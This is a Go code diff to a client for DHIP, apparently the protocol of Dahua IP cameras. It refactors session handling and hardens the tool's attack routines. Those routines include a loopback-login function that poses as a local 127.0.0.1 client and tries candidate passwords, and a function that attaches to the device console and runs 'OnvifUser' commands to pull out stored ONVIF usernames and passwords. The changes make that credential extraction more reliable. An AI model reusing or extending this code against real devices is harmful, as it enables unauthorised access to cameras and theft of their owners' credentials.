@@ -698,7 +698,7 @@ func (c *DHIPClient) Session() int {
 	return c.sess
 }
 
-func (c *DHIPClient) send(method string, params any, id int, object any) error {
+func (c *DHIPClient) send(method string, params any, id int, object any, sid ...any) error {
 	body := map[string]any{
 		"method":  method,
 		"params":  params,
@@ -707,6 +707,9 @@ func (c *DHIPClient) send(method string, params any, id int, object any) error {
 	}
 	if object != nil {
 		body["object"] = object
+	}
+	if len(sid) > 0 && sid[0] != nil {
+		body["SID"] = sid[0]
 	}
 	raw, _ := json.Marshal(body)
 
@@ -778,12 +781,12 @@ func (c *DHIPClient) readPacket(timeout time.Duration) (map[string]any, error) {
 
 const sweepCallTimeout = 5 * time.Second
 
-func (c *DHIPClient) Call(method string, params any, id int, object any, notifies *[]map[string]any) (map[string]any, error) {
-	return c.CallT(method, params, id, object, notifies, 15*time.Second)
+func (c *DHIPClient) Call(method string, params any, id int, object any, notifies *[]map[string]any, sid ...any) (map[string]any, error) {
+	return c.CallT(method, params, id, object, notifies, 15*time.Second, sid...)
 }
 
-func (c *DHIPClient) CallT(method string, params any, id int, object any, notifies *[]map[string]any, timeout time.Duration) (map[string]any, error) {
-	if err := c.send(method, params, id, object); err != nil {
+func (c *DHIPClient) CallT(method string, params any, id int, object any, notifies *[]map[string]any, timeout time.Duration, sid ...any) (map[string]any, error) {
+	if err := c.send(method, params, id, object, sid...); err != nil {
 		return nil, err
 	}
 	deadline := time.Now().Add(timeout)
@@ -833,14 +836,14 @@ func (c *DHIPClient) LoginNormal(user, pass string) error {
 			}
 		}
 		if result, _ := r["result"].(bool); result {
-			c.sess = dhipSessInt(r["session"])
+			c.sess = dhipSessOf(r)
 			return nil
 		}
 	}
 	params, _ := r["params"].(map[string]any)
 	realm, _ := params["realm"].(string)
 	random, _ := params["random"].(string)
-	c.sess = dhipSessInt(r["session"])
+	c.sess = dhipSessOf(r)
 	if realm == "" || random == "" {
 		return fmt.Errorf("dhip login: no challenge received")
 	}
@@ -860,7 +863,7 @@ func (c *DHIPClient) LoginNormal(user, pass string) error {
 		return fmt.Errorf("dhip login response: %w", err)
 	}
 	if result, _ := r2["result"].(bool); result {
-		c.sess = dhipSessInt(r2["session"])
+		c.sess = dhipSessOf(r2)
 		return nil
 	}
 	raw, _ := json.Marshal(r2)
@@ -882,14 +885,14 @@ func (c *DHIPClient) LoginNetKeyboard() error {
 		return fmt.Errorf("dhip login send: %w", err)
 	}
 	if result, _ := r["result"].(bool); result {
-		c.sess = dhipSessInt(r["session"])
+		c.sess = dhipSessOf(r)
 		return nil
 	}
 
 	params, _ := r["params"].(map[string]any)
 	realm, _ := params["realm"].(string)
 	random, _ := params["random"].(string)
-	challengeSess := dhipSessInt(r["session"])
+	challengeSess := dhipSessOf(r)
 	c.sess = challengeSess
 
 	if realm != "" && random != "" {
@@ -909,7 +912,7 @@ func (c *DHIPClient) LoginNetKeyboard() error {
 				continue
 			}
 			if result, _ := r2["result"].(bool); result {
-				c.sess = dhipSessInt(r2["session"])
+				c.sess = dhipSessOf(r2)
 				return nil
 			}
 		}
@@ -932,14 +935,14 @@ func (c *DHIPClient) LoginLoopback() error {
 		return fmt.Errorf("dhip loopback login send: %w", err)
 	}
 	if result, _ := r["result"].(bool); result {
-		c.sess = dhipSessInt(r["session"])
+		c.sess = dhipSessOf(r)
 		return nil
 	}
 
 	params, _ := r["params"].(map[string]any)
 	realm, _ := params["realm"].(string)
 	random, _ := params["random"].(string)
-	challengeSess := dhipSessInt(r["session"])
+	challengeSess := dhipSessOf(r)
 	c.sess = challengeSess
 
 	if realm == "" || random == "" {
@@ -960,7 +963,7 @@ func (c *DHIPClient) LoginLoopback() error {
 			continue
 		}
 		if result, _ := r3["result"].(bool); result {
-			c.sess = dhipSessInt(r3["session"])
+			c.sess = dhipSessOf(r3)
 			return nil
 		}
 	}
@@ -981,7 +984,7 @@ func (c *DHIPClient) LoginLoopback() error {
 			continue
 		}
 		if result, _ := r4["result"].(bool); result {
-			c.sess = dhipSessInt(r4["session"])
+			c.sess = dhipSessOf(r4)
 			return nil
 		}
 	}
@@ -996,17 +999,6 @@ func (c *DHIPClient) LoginLoopbackRealm() (string, error) {
 			"clientType": "Local", "loginType": "Loopback", "ipAddr": "127.0.0.1",
 			"authorityType": "Default", "passwordType": enc,
 		}
-	}
-	sessOf := func(r map[string]any) int {
-		if s, ok := r["session"].(float64); ok && s != 0 {
-			return int(s)
-		}
-		if p, ok := r["params"].(map[string]any); ok {
-			if s, ok := p["session"].(float64); ok && s != 0 {
-				return int(s)
-			}
-		}
-		return 0
 	}
 	realmOf := func(r map[string]any) string {
 		if p, ok := r["params"].(map[string]any); ok {
@@ -1025,12 +1017,12 @@ func (c *DHIPClient) LoginLoopbackRealm() (string, error) {
 			continue
 		}
 		if ok, _ := r["result"].(bool); ok {
-			if s := sessOf(r); s != 0 {
+			if s := dhipSessOf(r); s != 0 {
 				c.sess = s
 				return realmOf(r), nil
 			}
 		}
-		if chSess := sessOf(r); chSess != 0 {
+		if chSess := dhipSessOf(r); chSess != 0 {
 			if realm := realmOf(r); realm != "" {
 				c.sess = chSess
 				for _, cpwd := range candidates {
@@ -1039,7 +1031,7 @@ func (c *DHIPClient) LoginLoopbackRealm() (string, error) {
 						continue
 					}
 					if res2, _ := r2["result"].(bool); res2 {
-						if s2 := sessOf(r2); s2 != 0 {
+						if s2 := dhipSessOf(r2); s2 != 0 {
 							c.sess = s2
 						}
 						return realm, nil
@@ -1055,7 +1047,7 @@ func (c *DHIPClient) LoginLoopbackRealm() (string, error) {
 	}, 1, nil, nil, sweepCallTimeout)
 	if err == nil {
 		if realm := realmOf(rProbe); realm != "" {
-			if chSess := sessOf(rProbe); chSess != 0 {
+			if chSess := dhipSessOf(rProbe); chSess != 0 {
 				c.sess = chSess
 				for _, pwd := range candidates {
 					r2, err2 := c.CallT("global.login", loopParams(pwd, "Plain"), 2, nil, nil, sweepCallTimeout)
@@ -1063,7 +1055,7 @@ func (c *DHIPClient) LoginLoopbackRealm() (string, error) {
 						continue
 					}
 					if res2, _ := r2["result"].(bool); res2 {
-						if s2 := sessOf(r2); s2 != 0 {
+						if s2 := dhipSessOf(r2); s2 != 0 {
 							c.sess = s2
 						}
 						return realm, nil
@@ -1076,6 +1068,21 @@ func (c *DHIPClient) LoginLoopbackRealm() (string, error) {
 	return "", fmt.Errorf("loopback login failed")
 }
 
+// drainNotifies collects notify packets that keep arriving after a call,
+// waiting up to idleTimeout of silence and maxTotal overall
+func (c *DHIPClient) drainNotifies(idleTimeout, maxTotal time.Duration) []map[string]any {
+	var out []map[string]any
+	deadline := time.Now().Add(maxTotal)
+	for time.Now().Before(deadline) {
+		pkt, err := c.readPacket(idleTimeout)
+		if err != nil {
+			return out
+		}
+		out = append(out, pkt)
+	}
+	return out
+}
+
 func (c *DHIPClient) ExtractCredsViaConsole() (string, string, bool) {
 	r, err := c.Call("console.factory.instance", nil, 4, nil, nil)
 	if err != nil || r["result"] == nil {
@@ -1083,21 +1090,29 @@ func (c *DHIPClient) ExtractCredsViaConsole() (string, string, bool) {
 	}
 	obj := r["result"]
 
-	if _, err := c.Call("console.attach", map[string]any{"proc": obj}, 8, obj, nil); err != nil {
-		return "", "", false
+	var sid any
+	if att, aerr := c.Call("console.attach", map[string]any{"proc": obj}, 8, obj, nil); aerr == nil {
+		if params, _ := att["params"].(map[string]any); params != nil {
+			sid = params["SID"]
+		}
 	}
 
 	commands := []string{"OnvifUser -u", "OnvifUser -l", "OnvifUser"}
 	for _, cmd := range commands {
-		var notifies []map[string]any
-		r2, err := c.Call("console.runCmd", map[string]any{"command": cmd}, 6, obj, &notifies)
-		if err != nil {
-			continue
+		var all []map[string]any
+		for _, useObj := range []any{obj, nil} {
+			var notifies []map[string]any
+			r2, err := c.Call("console.runCmd", map[string]any{"command": cmd}, 6, useObj, &notifies, sid)
+			if err != nil {
+				continue
+			}
+			all = append(all, notifies...)
+			all = append(all, c.drainNotifies(400*time.Millisecond, time.Second)...)
+			if ok, _ := r2["result"].(bool); ok && len(all) > 0 {
+				break
+			}
 		}
-		if ok, _ := r2["result"].(bool); !ok {
-			continue
-		}
-		if user, pass, ok := parseOnvifNotifies(notifies); ok {
+		if user, pass, ok := parseOnvifNotifies(all); ok {
 			return user, pass, true
 		}
 	}
@@ -1219,6 +1234,17 @@ func dhipSessInt(v any) int {
 		return int(x)
 	case int:
 		return x
+	}
+	return 0
+}
+
+// read the session
+func dhipSessOf(pkt map[string]any) int {
+	if s := dhipSessInt(pkt["session"]); s != 0 {
+		return s
+	}
+	if params, ok := pkt["params"].(map[string]any); ok {
+		return dhipSessInt(params["session"])
 	}
 	return 0
 }
@@ -1803,7 +1829,7 @@ func hasErrPrefix(s string) bool {
 
 // fetch the model over DHIP
 func (t *PTCPTunnel) deviceModelViaDHIP() string {
-	for _, port := range []int{80, 5000} {
+	for _, port := range []int{5000, 80} {
 		dhip, err := t.NewDHIPClientOnPort(port)
 		if err != nil {
 			continue
